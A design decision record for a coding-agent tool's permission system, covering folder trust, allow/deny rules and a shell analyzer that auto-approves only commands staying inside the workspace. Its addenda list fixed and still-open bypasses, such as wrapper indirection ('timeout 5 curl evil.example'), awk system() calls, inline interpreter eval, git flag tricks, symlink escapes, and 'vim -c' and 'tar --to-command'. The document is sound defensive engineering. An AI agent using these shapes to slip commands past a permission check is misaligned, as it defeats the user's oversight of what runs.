# 0039. Folder trust, rules, and session grants

Status: accepted (2026-09-29).

## Context

Permissions are a core philosophy of LCA, but the UX was the weakest part.
Every shell command prompted, and the "always" option keyed on the exact
command string, so a build task that ran `cargo build 2>&1 | tail -30`
and then `… | tail -40` prompted twice. A dogfood pass (driving LCA to
build a chess game) took ~30 approvals for one task.

Two facts made the fix available. First, the requirement model already
distinguishes the workspace boundary: reads and writes **inside** the
project never prompt, because they are what the model's tools are for.
Second, pi has a folder-trust UX (`core/trust-manager.ts`,
`core/project-trust.ts`, `components/trust-selector.ts`): a `trust.json`
resolved by nearest ancestor, "Trust / Trust parent / Trust this session /
Do not trust" options, a `defaultProjectTrust` of `ask`/`always`/`never`,
and a prompt shown only when the project has trust-requiring resources.
LCA had the *storage* half — `GrantStore::is_trusted` gates
`.lca/config.toml` proposals and extension enablement — but `set_trusted`
was never called from the CLI: no prompt, no way to trust.

## Decision

**Folder trust, three ways.** A project is trusted persistently, trusted
for the session, or untrusted. Trust is asked once, Pi-shaped (Trust /
Trust this session only / Do not trust / Do not trust this session only),
and shown only when there is something to gate (a `.lca/config.toml`).
`/trust` reopens the picker, and the permission modal's `t` trusts the
folder for the session in one key.

**Trusting a folder means trusting its code.** Build tools run build
scripts and proc macros; that is accepted, exactly as it is in pi's
folder model. The analyzer therefore polices the *filesystem boundary*,
not "can this run code".

**A strict workspace-scoped analyzer** (`lca_permissions::shell`)
auto-approves a shell command only when it provably stays inside the
workspace. It refuses command substitution, shells and indirection,
privilege and disk tools, egress clients, package publishes, sensitive
environment variables, heredocs, and any path or redirection target that
leaves the workspace. It allows a `cd` whose target resolves inside the
workspace — the ubiquitous `cd <project> && …` idiom — resolving later
relative paths against the original cwd, which is conservative (it can
over-review, never over-allow). Everything else is allowed
(`cargo`/`git status`/`rm -rf target`/`sed -i src/…`). The bias is
deliberate: a false "review" costs one prompt, a false "allow" costs the
boundary, so anything the analyzer cannot reason about is reviewed.

**Rules with global defaults.** An allow/deny rule is a glob plus a
decision, at one of three scopes: **session** (in-memory, gone on exit),
**project**, or **global** (the user's cross-project defaults). Precedence:

1. a deny rule at any scope refuses, without a prompt;
2. an allow rule at any scope allows;
3. a stored exact/wildcard pattern (the existing ADR-0006 mechanism)
   allows;
4. a trusted folder plus the analyzer allows an in-workspace command;
5. otherwise the user is prompted.

Deny always beats allow, which is why the two are separate sets rather
than one ordered list.

**Session grants never persist.** Session trust and session rules live in
the in-memory `GrantStore` (`#[serde(skip)]`) and vanish when the process
exits. Persistence is an explicit act (`Trust`, or a project/global rule).

## Alternatives considered

**Pattern breadth instead of an analyzer** — make "always" store `cargo *`
rather than the whole command. Rejected: the threat model already names
broad pre-approved patterns as the weakest point of the model ("a user
who approved `git *` has approved `git config core.pager` pointing at an
arbitrary program"). The analyzer is narrower in effect and positive
rather than heuristic.

**A shell parser.** Rejected as the wrong risk/cost: a full POSIX grammar
is large and still not a sandbox. The tokenizer here is deliberately
small and refuses anything it does not understand.

**Trust gating every tool.** Rejected: in-workspace reads/writes already
need no prompt, and gating them behind trust would make the common case
worse. Trust changes exactly one thing — shell commands that stay inside.

**Per-command program allow-listing as the primary mechanism.** Rejected:
it needs a maintained list of safe programs and still cannot see paths.
The analyzer plus rules composes better and a user can still add
`/permissions allow <program> *` if they want that shape.

## Consequences

- The permission modal gained a fourth answer (`t`), the `/trust` picker,
  and `/permissions`. `/grants` now shows trust and rules first, so the
  view explains why a command does or does not prompt.
- `Decision` gained `TrustFolder`; `Outcome` gained `denied_by_rule`, so a
  rule refusal is recorded and reported to the model distinctly from a
  user denial.
- No ABI change: nothing here crosses the WIT boundary. The session
  `permission` record keeps its shape; a session trust is one record with
  `decision = once`.
- Trust persisted *after* startup takes effect for commands immediately
  (the grant store is read live), but project `.lca/config.toml`
  proposals are computed at startup and need a restart. Documented rather
  than worked around.
- The analyzer is a convenience, not a sandbox. A trusted folder can still
  damage itself and run its own build code; the residual risk is the same
  one pi's folder model accepts.

## Addendum (2026-10-10, gh #80)

Session trust now opens the project file at load: `-a`, an `always`
`trust.default_project`, and a mid-session `/trust` followed by
`/reload` all apply project files without a restart. The "needs a
restart" limitation above is retired for reload-or-later flows; a
trust granted mid-turn still applies to the next load, never the
running turn.

## Addendum (2026-10-16, gh #345/#346/#347)

The analyzer's refuse-set grew; the "provably stays inside" bar moved.
Three `p1-high` escapes shared one seam (`workspace_scoped` →
`segment_ok` → `path_ok`) and landed together. This addendum records
the shape change; the decision itself is unchanged.

- **gh #345 — git subcommand classification.** Both git checks read
  `toks[i + 1]`, so a global flag before the subcommand hid it:
  `git -C . push` and `git --no-pager push` auto-approved egress, and
  `git -c user.email=x config` auto-approved a config override.
  `git_subcommand` now walks past global flags, consuming the
  option-argument of `-C`/`-c`/`--git-dir`/`--work-tree`/`--namespace`/
  `--config-env` (detached) and treating `=`-attached forms as
  self-consuming. A config override, an `--exec-path`/`--super-prefix`
  redirect, a dangling flag-argument, or no subcommand at all makes the
  invocation unclassifiable, and unclassifiable refuses.
- **gh #346 — symlink resolution.** `path_ok` normalized lexically
  only, so a workspace symlink pointing outside made the linked path
  read as inside. It now resolves through `canonicalize_deepest`, the
  same helper `ScopeRoots::resolve` uses, so the model tool path and
  the extension `fs` boundary agree on "inside". The helper also folds
  a lexically-normalized non-existent tail, which closed a real
  parent-traversal escape in `ScopeRoots::resolve` when a `..` sat past
  a missing directory (FR-PERM-12). The direction is deliberate: a
  fold may over-refuse a `..` that crosses a symlink, and a false
  review costs one prompt.
- **gh #347 — interpreter inline eval.** No language runtime was in
  `DENY_PROGRAMS`, and an inline code string with no path-ish
  substring tripped no path check, so `python3 -c "<code>"`
  auto-approved arbitrary code. Inline eval is code *not in the
  workspace*, which the analyzer cannot reason about; a per-runtime
  `INTERPRETER_EVAL_FLAGS` table refuses it. Script-file invocations
  (`python3 scripts/run.py`) stay scoped — trusting a folder trusts the
  code in it, which is still the contract. Known trade: `python3 -m
  pytest` now reviews, because module code lives outside the
  workspace. **Fix-up (same day):** exact basename and exact-token
  matching left three ordinary forms open — a versioned name
  (`python3.12`), a Windows executable suffix (`python.exe`, `bash.exe`),
  and the glued short flag (`python3 -c'print(1)'`). `basename` strips
  known executable suffixes, the interpreter name accepts a tight
  version suffix, and a single-letter flag matches its attached argument;
  the suffix strip also closes the same gap in `DENY_PROGRAMS`.

None of the three is an ABI change. Guards live in the analyzer's own
unit matrices plus turn-level regression files
(`tests/regressions/345-*.rs`, `346-*.rs`, `347-*.rs`) that drive a
whole turn through a recording permission prompt.

### Follow-up recorded, not fixed here

`is_package_mutation` has the same flag-argument weakness
(`cargo -Z unstable-options install` reads `unstable-options` as the
subcommand and misses `install`). It was out of scope for the gh #345
batch and is noted for a follow-up rather than fixed speculatively.

## Revisit conditions

- A real command the analyzer refuses that a user reasonably expects to be
  auto-approved. That argues for a rule or a narrower analyzer gap, not
  for loosening the boundary.
- Evidence that users trust folders without reading, making the prompt
  theater. That would argue for a narrower trust scope, the same revisit
  ADR-0006 records for proposals.
- A capability-shaped gap (a legitimate in-workspace command that needs
  something outside it) that rules cannot express. That would be a
  capability question, not an analyzer one.

## Addendum (2026-10-22, gh #365)

The refuse-set grew again; the line #347 drew at *inline command-line code*
was found to run through a gap. Recorded here because the decision shape is
unchanged and only its reach moved.

- **gh #365 — positional program text.** #347 closed evaluator *flags*
  (`python3 -c`, `node -e`) with `INTERPRETER_EVAL_FLAGS`. Several tools carry
  the same kind of code as a plain **positional argument** instead, and those
  still auto-approved in a trusted folder: `awk 'BEGIN{system("curl
  evil.example")}'`, `gawk`/`mawk`/`nawk`, `busybox awk`, `osascript -e`, `irb
  -e`. This is code that is in no file at all — the same class #347 drew the
  line against — so it is refused on the same rule, extended:
  `PROGRAM_TEXT_PROGRAMS` reviews unless the program arrives as an
  **in-workspace file** (`awk -f scripts/x.awk` stays scoped, and a `-f` path
  outside the workspace still reviews). The set is *measured* (48 invocations
  enumerated) rather than taken from the issue's three examples, because
  `mawk`/`nawk`/`busybox awk` are the same program under other names.
- **`sed`'s `e` flag, and why `sed` is not refused.** `sed 's/x/y/e'`
  re-executes the substitution's result as a command — inline code by another
  name. But `sed` is used constantly for legitimate edits, and a blanket
  refusal is precisely the over-review this ADR warns about (prompts people
  approve without reading). The `e` flag is a **suffix on an `s` command**
  (`s///e`, `s///ge`, `s///ep`) or a standalone `e` command, so only those
  shapes review: `sed -i 's/x/y/'`, `sed -n '1,10p'`, `sed 's/e/E/g'` all stay
  scoped, and a `-f` script is the folder's own code. The rule is textual and
  narrow on purpose; it does not attempt to parse the whole sed language.
- **gh #365 — wrapper indirection, found while enumerating.** The measurement
  turned up a sharper hole in the same "hides what runs" family:
  `timeout 5 curl evil.example`, `nice curl …`, `stdbuf -o0 curl …` and
  `ionice curl …` auto-approved **although `curl` is in `DENY_PROGRAMS`** — the
  wrapper is the program, so the denied name was merely an unclassified
  argument. Unlike the `awk` case there is no false-positive trade to weigh
  (the argument is an exact program name), so `EXEC_WRAPPERS` plus
  `MULTI_CALL` (`busybox wget`, `busybox sh -c`) now classify it.
  `timeout 5 cargo test` stays scoped, which is the row proving it is not a
  refusal of wrappers.

**Option B in the issue — a "does this argument parse as a program?"
heuristic — was rejected.** It cannot be made provable: "is this string a
program in this language" is undecidable in general, and a guess **fails open**
on whatever syntax its author did not consider. A set is auditable and a wrong
membership is a visible diff; a heuristic's wrong answer is silent. Option C
(decline) was rejected because these are not the `make`/`cargo build` case: those
run **workspace** code, which the trust model deliberately accepts, whereas
`awk 'BEGIN{…}'` runs code in no file at all.

**Reported, not fixed in this cycle:** `vim -c ':!id'` and
`tar --to-command=id` also auto-approve. Both need their own classification
decision (which `tar` flags execute, whether an editor's `-c` is in scope at
all), and neither is a positional-program case, so they are recorded for a
follow-up rather than swept in speculatively.

Guards: the analyzer's own unit matrices plus
`tests/regressions/365-*.rs`, which pins the verdicts above at both the
predicate and whole-turn level.
